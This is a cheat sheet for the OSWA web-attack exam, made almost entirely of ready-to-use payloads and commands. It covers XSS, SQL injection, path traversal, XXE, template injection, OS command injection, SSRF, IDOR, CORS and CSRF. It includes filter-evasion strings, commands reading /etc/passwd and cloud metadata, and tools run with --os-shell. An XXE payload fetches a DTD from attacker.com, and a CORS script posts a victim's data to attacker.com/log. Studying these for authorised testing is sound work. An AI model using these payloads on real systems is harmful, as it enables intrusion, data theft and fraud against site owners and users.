# OSWA Quick Reference Cheat Sheet
**Emergency Quick Reference - All Vulnerabilities**

---

## XSS (Cross-Site Scripting)

### Top 5 Payloads
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>
javascript:alert(document.cookie)
```

### Detection One-Liners
```bash
# Reflected
curl "https://target.com/search?q=<script>alert(1)</script>"

# DOM-based (check response for reflection in JS)
curl "https://target.com/page#<img src=x onerror=alert(1)>"

# Quick test with Dalfox
dalfox url "https://target.com/search?q=FUZZ"
```

### Common Bypasses
```javascript
<sCrIpT>alert(1)</sCrIpT>               # Case variation
<script>alert(1)<!--                    # Incomplete tag
<svg/onload=alert(1)>                   # Alternative tags
<img src=x onerror=&#97;lert(1)>        # HTML encoding
```

---

## SQL Injection

### Top 5 Payloads
```sql
' OR '1'='1' --
' UNION SELECT NULL,NULL,NULL--
' AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--
'; WAITFOR DELAY '00:00:05'--          # Time-based
' AND SUBSTRING(@@version,1,1)='5'--   # Boolean-based
```

### Detection One-Liners
```bash
# Quick test
curl "https://target.com/page?id=1'"

# SQLMap fast scan
sqlmap -u "https://target.com/page?id=1" --batch --level=1 --risk=1

# Boolean-based detection
curl "https://target.com/page?id=1' AND '1'='1"  # Should work
curl "https://target.com/page?id=1' AND '1'='2"  # Should fail
```

### Common Bypasses
```sql
' OR '1'='1' --                         # Basic bypass
' OR 1=1#                               # Hash comment
' /*!50000UNION*/ SELECT--              # Version comment
' OR 'x'='x                             # Alternative comparison
admin'--                                # Comment out password
```

---

## Directory Traversal / LFI

### Top 5 Payloads
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd%00.jpg
```

### Detection One-Liners
```bash
# Linux
curl "https://target.com/download?file=../../../../etc/passwd"

# Windows
curl "https://target.com/download?file=..\..\..\..\windows\win.ini"

# PHP filter (source code)
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"
```

### Common Bypasses
```
../                                     # Standard
..%2F                                   # URL encoded
..%252F                                 # Double encoded
....//                                  # Filter bypass
..;/                                    # Null byte variation
%2e%2e%2f                              # Full URL encoding
```

---

## XXE (XML External Entity)

### Top 5 Payloads
```xml
<!-- Classic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- OOB XXE -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>

<!-- XInclude -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

<!-- SVG XXE -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text>&xxe;</text></svg>
```

### Detection One-Liners
```bash
# Basic test
curl -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "XXE">]><foo>&test;</foo>' \
  https://target.com/api

# With XXEinjector
ruby XXEinjector.rb --host=target.com --path=/etc/passwd --file=request.xml
```

### Common Bypasses
```xml
<!-- UTF-7 encoding -->
+ADw-!DOCTYPE foo+AD4-

<!-- XInclude when DOCTYPE blocked -->
<xi:include href="file:///etc/passwd"/>

<!-- OOB when direct XXE blocked -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;
```

---

## SSTI (Server-Side Template Injection)

### Top 5 Payloads
```python
# Jinja2 (Python)
{{7*7}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Detection One-Liners
```bash
# Quick detection
curl "https://target.com/page?name={{7*7}}"        # Should return 49
curl "https://target.com/page?name={{7*'7'}}"      # Jinja2: 7777777, Twig: 49

# With tplmap
python tplmap.py -u "https://target.com/page?name=test"
```

### Common Bypasses
```python
# If 'config' blocked
{{self._TemplateReference__context}}

# If '.' blocked
{{config['__class__']}}

# If '__' blocked
{%set chr=cycler.__init__.__globals__.__builtins__.chr%}

# String concatenation
{{'__cla'+'ss__'}}
```

---

## Command Injection

### Top 5 Payloads
```bash
; whoami
| whoami
& whoami &
`whoami`
$(whoami)
```

### Detection One-Liners
```bash
# Time-based (most reliable)
curl "https://target.com/ping?ip=127.0.0.1;sleep+5"    # Should delay 5 sec

# Output-based
curl "https://target.com/ping?ip=127.0.0.1;id"

# OOB
curl "https://target.com/ping?ip=127.0.0.1;curl+http://burp-collab.com"
```

### Common Bypasses
```bash
# Space bypass
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Keyword bypass
c''at /etc/passwd
/???/c?t /etc/passwd

# Quote bypass
w'h'o'a'm'i

# Encoding
$(echo$IFS"d2hvYW1p"|base64$IFS-d)     # base64: whoami
```

---

## SSRF (Server-Side Request Forgery)

### Top 5 Payloads
```
http://localhost/admin
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/     # AWS metadata
http://[::1]/admin                           # IPv6 localhost
file:///etc/passwd
```

### Detection One-Liners
```bash
# Basic test
curl -X POST -d '{"url":"http://burp-collab.com"}' https://target.com/api/fetch

# AWS metadata
curl -X POST -d '{"url":"http://169.254.169.254/latest/meta-data/"}' https://target.com/api

# Internal scan
curl -X POST -d '{"url":"http://192.168.1.1"}' https://target.com/api
```

### Common Bypasses
```
# IP encoding
http://2130706433/              # Decimal for 127.0.0.1
http://0x7f000001/              # Hex for 127.0.0.1
http://0177.0.0.1/              # Octal

# Domain bypasses
http://localtest.me/            # Resolves to 127.0.0.1
http://169.254.169.254.nip.io/

# DNS rebinding
http://7f000001.1time.169.254.169.254.1time.repeat.rebind.network/
```

---

## IDOR (Insecure Direct Object Reference)

### Top 5 Test Cases
```
# Profile access
GET /api/user/1001  →  GET /api/user/1002

# Document download
GET /download?docId=5001  →  GET /download?docId=5002

# Order details
GET /api/order/12345  →  GET /api/order/12346

# Message access
GET /messages?msgId=9001  →  GET /messages?msgId=9002

# Admin access (vertical)
GET /api/user/1001  →  GET /api/admin/users?userId=1
```

### Detection One-Liners
```bash
# Test with two accounts
# Account A
curl -H "Authorization: Bearer TOKEN_A" https://target.com/api/profile?userId=1001

# Account B accessing Account A's data
curl -H "Authorization: Bearer TOKEN_B" https://target.com/api/profile?userId=1001
# If successful → IDOR vulnerable
```

### Common Bypasses
```
# Encoded IDs
userId=MTAwMQ==        # Base64
userId=31303031        # Hex

# UUID guessing (if sequential)
userId=550e8400-e29b-41d4-a716-446655440000

# HTTP methods
GET /api/user/1002     # Forbidden
POST /api/user/1002    # May work
```

---

## CORS Misconfiguration

### Top 5 Test Payloads
```bash
# Test arbitrary origin
curl -H "Origin: https://evil.com" -I https://target.com/api

# Test null origin
curl -H "Origin: null" -I https://target.com/api

# Test subdomain
curl -H "Origin: https://evil.target.com" -I https://target.com/api

# Check response for:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### Exploitation
```javascript
// On attacker's site
fetch('https://vulnerable.com/api/user', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/log', {
  method: 'POST',
  body: JSON.stringify(data)
}));
```

---

## CSRF (Cross-Site Request Forgery)

### Top 5 Test Cases
```html
<!-- GET-based CSRF -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- POST-based CSRF -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- JSON CSRF (if CORS allows) -->
<script>
fetch('https://api.bank.com/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>
```

### Detection One-Liners
```bash
# Burp Suite: Right-click request → Engagement Tools → Generate CSRF PoC

# Manual test - Remove CSRF token
curl -X POST https://target.com/action \
  -H "Cookie: session=VALID_SESSION" \
  -d "action=delete&id=1"
# If successful without token → CSRF vulnerable
```

---

## Quick Tool Commands

```bash
# XSS
dalfox url "https://target.com?q=FUZZ"
xsstrike -u "https://target.com?q=test"

# SQLi
sqlmap -u "https://target.com?id=1" --batch --dbs
sqlmap -r request.txt --level=5 --risk=3

# Directory Traversal
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd
ffuf -u "https://target.com/file?path=FUZZ" -w lfi-list.txt

# XXE
ruby XXEinjector.rb --host=target.com --path=/etc/passwd --file=req.xml

# SSTI
python tplmap.py -u "https://target.com?name=test" --os-shell

# Command Injection
python commix.py --url="https://target.com?ip=127.0.0.1" --os-shell

# SSRF
python ssrfmap.py -r request.txt -p url -m aws

# IDOR
# Use Burp Autorize extension or manual testing with 2 accounts
```

---

## Emergency Response Codes

| Code | Meaning | Action |
|------|---------|--------|
| 200 | OK | Payload may have worked |
| 403 | Forbidden | Access control blocking |
| 404 | Not Found | Resource doesn't exist |
| 500 | Internal Error | Payload may have caused error (good for SQL injection detection) |
| 302 | Redirect | Follow redirect, may indicate success |

---

## Time Estimates (for exam planning)

| Attack | Time to Test | Time to Exploit |
|--------|--------------|-----------------|
| XSS | 5-10 min | 10-20 min |
| SQL Injection | 10-15 min | 20-40 min |
| Directory Traversal | 5-10 min | 10-15 min |
| XXE | 10-15 min | 15-30 min |
| SSTI | 10-15 min | 20-30 min |
| Command Injection | 5-10 min | 15-25 min |
| SSRF | 10-15 min | 20-30 min |
| IDOR | 10-15 min | 15-25 min |

---

**Print this page for exam day reference!**
